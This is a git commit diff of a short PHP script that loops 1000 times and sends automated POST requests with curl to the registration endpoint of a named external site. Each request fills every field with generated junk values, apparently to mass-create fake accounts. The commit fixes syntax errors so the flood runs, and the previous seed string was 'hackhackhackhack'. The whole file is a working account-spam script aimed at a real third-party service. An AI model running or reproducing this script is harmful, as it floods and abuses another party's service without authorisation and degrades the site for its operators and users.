1db693a0fc05e45bb95bec53de111669b85c3073
agungdh <agungdh@live.com>
2018-04-12 10:14:25 +0700

    update

--- index.php
+++ index.php
@@ -1,26 +1,29 @@
 <?php
 // set post fields
-$kata = "hackhackhackhack";
+$kata = "bowikganteng1234tapiboong";
 
 for ($i=1; $i <= 1000 ; $i++) {
 	$kata_tmp = $kata . $i; 
-	$post['username'] = $kata_tmp,
-	$post['password'] = $kata_tmp,
-	$post['email'] = $kata_tmp,
-	$post['nama'] = $kata_tmp,
-	$post['pembimbing'] = $kata_tmp,
-	$post['ketua'] = $kata_tmp,
-	$post['sekertaris'] = $kata_tmp,
-	$post['bendahara'] = $kata_tmp
+	$post['username'] = $kata_tmp;
+	$post['password'] = $kata_tmp;
+	$post['email'] = $kata_tmp . '@' . $kata_tmp . '.' . $kata_tmp;
+	$post['nama'] = $kata_tmp;
+	$post['pembimbing'] = $kata_tmp;
+	$post['ketua'] = $kata_tmp;
+	$post['sekertaris'] = $kata_tmp;
+	$post['bendahara'] = $kata_tmp;
 
 	$ch = curl_init('http://appk.traoz.xyz/Login/register');
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
 
-	curl_exec($ch);
-
-	curl_close($ch);
-
+	try{
+		curl_exec($ch);
+		curl_close($ch);
+	} catch(Exception $e){
+		?><p><?php echo $e->getMessage();?><?php
+	}
+	
 	?>
 	<p>Created: <?php echo $kata_tmp; ?></p>
 	<?php
